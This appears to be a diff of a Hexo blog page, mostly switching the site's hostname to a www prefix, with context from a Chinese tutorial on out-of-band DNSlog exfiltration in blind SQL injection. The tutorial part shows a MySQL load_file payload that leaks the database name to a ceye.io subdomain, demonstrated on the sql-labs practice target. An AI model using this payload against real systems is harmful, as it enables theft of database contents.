@@ -17,13 +17,13 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"hzktester.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"www.hzktester.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="DNSlog回显原理首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。  DNS在解析的时候会留下日志，这个就是读取多级域名的解析日志，来获取信息简">
 <meta property="og:type" content="article">
 <meta property="og:title" content="巧用DNSlog实现无回显注入">
-<meta property="og:url" content="https://hzktester.top/posts/b6cdb199.html">
+<meta property="og:url" content="https://www.hzktester.top/posts/b6cdb199.html">
 <meta property="og:site_name" content="Hzktester&#96;s Blog">
 <meta property="og:description" content="DNSlog回显原理首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。  DNS在解析的时候会留下日志，这个就是读取多级域名的解析日志，来获取信息简">
 <meta property="og:locale" content="zh_CN">
@@ -45,7 +45,7 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://qiniu.hzktester.top/tp2020112001.png">
 
-<link rel="canonical" href="https://hzktester.top/posts/b6cdb199.html">
+<link rel="canonical" href="https://www.hzktester.top/posts/b6cdb199.html">
 
 
 <script id="page-configurations">
@@ -209,7 +209,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/posts/b6cdb199.html">
+    <link itemprop="mainEntityOfPage" href="https://www.hzktester.top/posts/b6cdb199.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -291,7 +291,7 @@
 <p>以下利用，我这里使用<code>ceye</code>平台演示。<br><img src="https://qiniu.hzktester.top/tp2020112002.png" alt="image.png"><br>他会给你一个三级域名，你把信息写在第四级域名上就好了，比如我这里访问hzktester.xxxx.cece.io ，访问之后就会有查询记录。<br><img src="https://qiniu.hzktester.top/tp2020112003.png" alt="tp2020112003.png"><br><img src="https://qiniu.hzktester.top/tp2020112004.png" alt="image.png"></p>
 <h2 id="利用一：SQL注入"><a href="#利用一：SQL注入" class="headerlink" title="利用一：SQL注入"></a>利用一：SQL注入</h2><h3 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h3><p>不论是<code>bool</code>型盲注还是时间型盲注，都需要频繁的跑请求才能够获取数据库中的值，在现代<code>WAF</code>的防护下，很可能导致IP被<code>ban</code>。</p>
 <p>这个时候我们可以结合<code>DNSLOG</code>完美快速的将数据取出。如遇到<code>MySql</code>的盲注时，可以利用内置函数<code>load_file()</code>来完成<code>DNSLOG</code>。<code>load_file()</code>不仅能够加载本地文件，同时也能对诸如\<a target="_blank" rel="noopener" href="http://www.test.com/">www.test.com</a>这样的<code>URL</code>发起请求。</p>
-<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p><code>load_file()</code>需要设置<code>secure_file_priv</code>的值，可以参考这篇文章，这里就不赘述了。<a href="https://hzktester.top/posts/d83e4025.html">链接</a></p>
+<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p><code>load_file()</code>需要设置<code>secure_file_priv</code>的值，可以参考这篇文章，这里就不赘述了。<a target="_blank" rel="noopener" href="https://hzktester.top/posts/d83e4025.html">链接</a></p>
 <h3 id="sql-labs靶场复现"><a href="#sql-labs靶场复现" class="headerlink" title="sql-labs靶场复现"></a>sql-labs靶场复现</h3><p>在<code>mysql</code>命令行执行：<code>select load_file(&#39;\\\\afanti.xxxx.ceye.io\\aaa&#39;);</code>其中<code>afanti</code>就是要注入的查询语句</p>
 <p><code>payload</code>：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxxx.ceye.io\\aaa&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>
@@ -324,7 +324,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://hzktester.top/posts/b6cdb199.html" title="巧用DNSlog实现无回显注入">https://hzktester.top/posts/b6cdb199.html</a>
+    <a href="https://www.hzktester.top/posts/b6cdb199.html" title="巧用DNSlog实现无回显注入">https://www.hzktester.top/posts/b6cdb199.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
